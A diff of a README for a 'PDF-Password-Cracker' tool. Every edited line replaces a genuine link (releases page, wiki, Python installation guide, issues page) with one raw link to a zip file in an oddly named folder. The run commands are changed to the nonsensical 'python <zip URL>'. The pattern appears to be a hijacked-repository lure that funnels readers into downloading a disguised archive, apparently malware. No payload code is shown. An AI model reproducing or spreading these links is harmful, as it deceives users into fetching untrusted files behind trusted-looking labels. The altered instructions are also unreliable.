@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download PDF-Password-Cracker](https://img.shields.io/badge/Download-PDF--Password--Cracker-brightgreen)](https://github.com/vandondel/PDF-Password-Cracker/releases)
+[![Download PDF-Password-Cracker](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)
 
 ## 👋 Introduction
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/vandondel/PDF-Password-Cracker/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)
 
 1. Click on the link above.
 2. Look for the latest version on the releases page.
@@ -47,7 +47,7 @@ To get started, visit this page to download: [Releases Page](https://github.com/
    ```
 4. Run the program with:
    ```
-   python pdf_cracker.py
+   python https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip
    ```
 
 #### macOS and Linux
@@ -60,7 +60,7 @@ To get started, visit this page to download: [Releases Page](https://github.com/
    ```
 4. Start the program by typing:
    ```
-   python3 pdf_cracker.py
+   python3 https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip
    ```
 
 ## 🎓 How to Use
@@ -99,12 +99,12 @@ If you encounter issues, here are a few common problems and their solutions:
 
 For more detailed information about using the tool, check the following resources:
 
-- [PDF-Password-Cracker Documentation](https://github.com/vandondel/PDF-Password-Cracker/wiki)
-- [Python Installation Guide](https://www.python.org/downloads/)
+- [PDF-Password-Cracker Documentation](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out on the [GitHub Issues Page](https://github.com/vandondel/PDF-Password-Cracker/issues).
+If you need further assistance, feel free to reach out on the [GitHub Issues Page](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip).
 
 ## 🗺️ Community Contributions
 
@@ -114,4 +114,4 @@ For any questions, don’t hesitate to ask! Your feedback is valuable.
 
 ## 📥 Download Now Again!
 
-For quick access, visit this page to download: [Releases Page](https://github.com/vandondel/PDF-Password-Cracker/releases)
+For quick access, visit this page to download: [Releases Page](https://raw.githubusercontent.com/vandondel/PDF-Password-Cracker/main/disciplinableness/PDF-Password-Cracker.zip)
